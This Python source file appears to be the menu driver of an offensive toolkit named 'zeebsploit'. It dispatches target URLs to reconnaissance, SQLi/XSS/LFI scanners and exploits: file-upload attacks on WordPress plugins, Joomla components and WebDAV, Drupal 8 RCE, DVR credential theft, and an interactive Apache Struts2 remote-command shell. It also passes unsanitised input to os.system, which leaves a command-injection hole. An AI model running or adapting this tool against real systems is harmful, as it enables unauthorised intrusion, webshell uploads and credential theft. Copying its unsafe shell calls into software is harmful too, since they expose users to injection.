#-*- coding: utf-8 -*-
from .modules import information_gathering as i_
from .modules import scanner as s_
from .modules import wp_exploit as wp
from .modules import joomla_exploit as joom
from .modules import other_exploit as ex_
from requests.exceptions import ConnectionError
from requests.exceptions import MissingSchema
from requests.exceptions import RequestException
from requests.exceptions import ReadTimeout
from .modules.color import R,G,B,Y,W
from .tmp.help import Helper as hlp
from . import start as zeeber
import urllib3,requests,readline,whois,os


requests.packages.urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class infoga(
             i_.cms_detector,
             i_.header_information,
             i_.geoloc,
             i_.email_search,
             i_.trace,
             i_.robot
             ):
      pass


class scanner(
              s_.subdomain,
              s_.sqli_scan,
              s_.xss_scan,
              s_.lfi_scan,
              s_.adfin,
              s_.takeover
              ):
      pass

class wp_exploit(
                 wp.wp_content_inject,
                 wp.wp_revslider,
                 wp.wp_learndash,
                 wp.wp_showbiz
                 ):
      pass

class joomla_exploit(
                     joom.com_fabrik,
                     joom.com_ads_manager,
                     joom.joomanager_config,
                     joom.com_jdownload
                     ):
      pass

class _exploit(
               ex_.apache_struts_rce,
               ex_.drupal8_rce,
               ex_.dvr_leak_cred,
               ex_.webdav
               ):
      pass

def information_gathering():
    _inf = infoga()
    print(f"\n{Y}[!]{W} Type {R}'Exit'{W} for out from this Tool\n")
    print(f"\n{Y}[!]{W} Type {G}'Help'{W} for show modules\n")
    print(f"\n{Y}[!]{W} Type {Y}'back'{W} for back to main menu\n")
    while True:
           try:
               xxx = str(input(f'[zsf/{R}information-gathering{W}/]: ')).lower()
               if   xxx == 'cms detector':
                    print('\n')
                    _inf.cms_detector(str(input('Host : ')))
                    print("\n")
               elif xxx == 'port scanner':
                    print('\n')
                    tgt = str(input("Host/IP : "))
                    os.system('nmap --open %s'%tgt)
                    print('\n')
               elif xxx == 'information header':
                    print('\n')
                    _inf.header(str(input('Url : ')))
                    print('\n')
               elif xxx == 'ip geolocation':
                    print('\n')
                    _inf.geo_location(str(input('Host/IP : ')))
                    print('\n')
               elif xxx == 'email searcher':
                    print('\n')
                    _inf.Email_search(str(input('Url : ')))
                    print('\n')
               elif xxx == 'traceroute':
                    print('\n')
                    _inf.traceroute(str(input('Host/IP :')))
                    print('\n')
               elif xxx == 'robot.txt detector':
                    print('\n')
                    _inf.Robot(str(input('Url : ')))
                    print('\n')
               elif xxx == 'whois lookup':
                    print('\n')
                    tgt = str(input('Host : '))
                    s = whois.whois(tgt)
                    print(s)
                    print('\n')
               elif xxx == 'help':
                    print('\n')
                    hlp.infoga_helper()
                    print('\n')
               elif xxx == 'back':
                    print('\n')
                    zeeber.zeeb_sploit().zeebsploit_framework()
                    print('\n')
               elif xxx == 'exit':
                    print('\n')
                    exit('Exit.....')
                    print('\n')
               else:
                    print(f"\n - No Command {xxx}\n")
           except ConnectionError:
               print(f"\n{R}[x]{W} No Internet Connection\n")
           except ReadTimeout:
               print(f"\n{R}[-]{W} Connection Timeout\n")
           except MissingSchema:
               print(f"\n{Y}[!]{W} Try Start with http:// or https://\n")
           except KeyboardInterrupt:
               break
           except EOFError:
               break
                    
def __scanner():
    _scan = scanner()
    print(f"\n{Y}[!]{W} Type {R}'Exit'{W} for out from this Tool\n")
    print(f"\n{Y}[!]{W} Type {G}'Help'{W} for show modules\n")
    print(f"\n{Y}[!]{W} Type {Y}'back'{W} for back to main menu\n")
    while True:
           try:
               xxx = str(input(f'[zsf/{R}scanner{W}/]: ')).lower()
               if   xxx == 'subdomain scanner':
                    print('\n')
                    _scan.subdomain_scanner(str(input('Domain : ')))
                    print('\n')
               elif xxx == 'sqli scanner':
                    print('\n')
                    _scan.SQLi_scanner(str(input('Url : ')))
                    print('\n')
               elif xxx == 'xss scanner':
                    print('\n')
                    _scan.xss_scanner(str(input('Url : ')))
                    print('\n')
               elif xxx == 'lfi scanner':
                    print('\n')
                    _scan.LFI_scanner(str(input('Url : ')))
                    print('\n')
               elif xxx == 'admin login finder':
                    print('\n')
                    _scan.admin_page_finder(str(input('Url : ')))
                    print('\n')
               elif xxx == 'directory scanner':
                    print('\n')
                    tgt = str(input('Url : '))
                    os.system('dirhunt %s' %tgt)
                    print('\n')
               elif xxx == 'subdomain takeover':
                    print('\n')
                    _scan.subdomain_takeover(str(input('subdomain : ')))
                    print('\n')
               elif xxx == 'help':
                    print('\n')
                    hlp.scanner_helper()
                    print('\n')
               elif xxx == 'back':
                    print('\n')
                    zeeber.zeeb_sploit().zeebsploit_framework()
                    print('\n')
               elif xxx == 'exit':
                    print('\n')
                    exit('Exit....')
                    print('\n')
               else:
                    print(f"\n - No Command {xxx}\n")
           except ConnectionError:
               print(f"\n{R}[x]{W} No Internet Connection\n")
           except ReadTimeout:
               print(f"\n{R}[-]{W} Connection Timeout\n")
           except MissingSchema:
               print(f"\n{Y}[!]{W} Try Start with http:// or https://\n")
           except KeyboardInterrupt:
               break
           except EOFError:
               break
                    

def exploitation():
    _wp = wp_exploit()
    _joom = joomla_exploit()
    _oth = _exploit()
    print(f"\n{Y}[!]{W} Type {R}'Exit'{W} for out from this Tool\n")
    print(f"\n{Y}[!]{W} Type {G}'Help'{W} for show modules\n")
    print(f"\n{Y}[!]{W} Type {Y}'back'{W} for back to main menu\n")
    while True:
           try:
              xxx = str(input(f'[zsf/{R}exploit{W}/]: ')).lower()
              if   xxx == 'wp content injection':
                   print('\n')
                   _wp.wordpress_content_injection(str(input('Url : ')))
                   print('\n')
              elif xxx == 'wp revslider':
                   print('\n')
                   _wp.wp_revslider_arbitary_file_upload(
                                   str(input('Url : ')),
                                   str(input('Path your file want To upload : ')),
                                   str(input('upload file with name? : '))
                   )
                   print('\n')
              elif xxx == 'wp learndash':
                   print('\n')
                   _wp.wp_learndash_arbitary_file_upload(
                                  str(input('Url : ')),
                                  str(input('Path your file want To upload : ')),
                                  str(input('upload file with name? : '))
                   )
                   print('\n')
              elif xxx == 'wp showbiz':
                   print('\n')
                   _wp.wp_showbiz_arbitary_file_upload(
                                 str(input('Url : ')),
                                 str(input('Path your file want To upload : ')),
                                 str(input('upload file with name? : '))
                   )
                   print('\n')
              elif xxx == 'joomla com fabrik':
                   print('\n')
                   _joom.joomla_com_fabrik(
                                   str(input('Url : ')),
                                   str(input('Path your file want To upload : ')),
                                   str(input('upload file with name? : '))
                   )
                   print('\n')
              elif xxx == 'joomla com ads manager':
                   print('\n')
                   _joom.joomla_com_ads_manager(
                                   str(input('Url : ')),
                                   str(input('Path your file want To upload : ')),
                                   str(input('upload file with name? : '))
                   )
                   print('\n')
              elif xxx == 'joomla manager get config':
                   print('\n')
                   _joom.joomla_manager_get_config(
                                   str(input('Url : ')),
                                   str(input('Path your file want To upload : ')),
                                   str(input('upload file with name? : '))
                   )
                   print('\n')
              elif xxx == 'joomla jdownload':
                   print('\n')
                   _joom.joomla_com_jdownloads_file_upload(
                                   str(input('Url : ')),
                                   str(input('Path your file want To upload : ')),
                                   str(input('upload file with name? : ')),
                                   str(input("Your Email : ")),
                                   str(input('Description : '))
                   )
                   print('\n')
              elif xxx == 'apache struts rce':
                   print('\n')
                   tgt = str(input('Url : '))
                   if len(_oth.apache_struts2_rce(tgt,'whoami')) > 15:
                      print(f'\n{R}[x]{W} Not Vulnerability\n')
                   else:
                      print(f"{G}[*]{W} Vulnerability")
                      print("Type 'exit' for stop ")
                      while True:
                            cmn = str(input('command > '))
                            if cmn == 'exit':
                               break
                            else:
                               print(_oth.apache_struts2_rce(tgt,cmn))
              elif xxx == 'drupal8 rce':
                   print('\n')
                   _oth.drupal_version8_RCE(str(input('Url : ')))
                   print('\n')
              elif xxx == 'dvr cam leak credential':
                   print('\n')
                   _oth.dvr_cam_leak_credentials(str(input('Host : ')))
                   print('\n')
              elif xxx == 'webdav file upload':
                   print("\n")
                   _oth.webdav_file_upload(
                              str(input('Url : ')),
                              str(input('path your file want To upload : ')),
                              str(input('upload with name? : '))
                              )
                   print('\n')
              elif xxx == 'help':
                   print('\n')
                   hlp.exploit_modules()
                   print('\n')
              elif xxx == "back":
                   print('\n')
                   zeeber.zeeb_sploit().zeebsploit_framework()
                   print('\n')
              elif xxx == 'exit':
                   exit('Exit.....')
              else:
                   print(f'\n - No Command {xxx}\n ')
           except ConnectionError:
              print(f"\n{R}[x]{W} No Internet Connection\n")
           except ReadTimeout:
              print(f"\n{R}[-]{W} Connection Timeout\n")
           except MissingSchema:
              print(f"\n{Y}[!]{W} Try Start with http:// or https://\n")
           except FileNotFoundError as e:
              print(e)
           except KeyboardInterrupt:
              break
           except EOFError:
              break
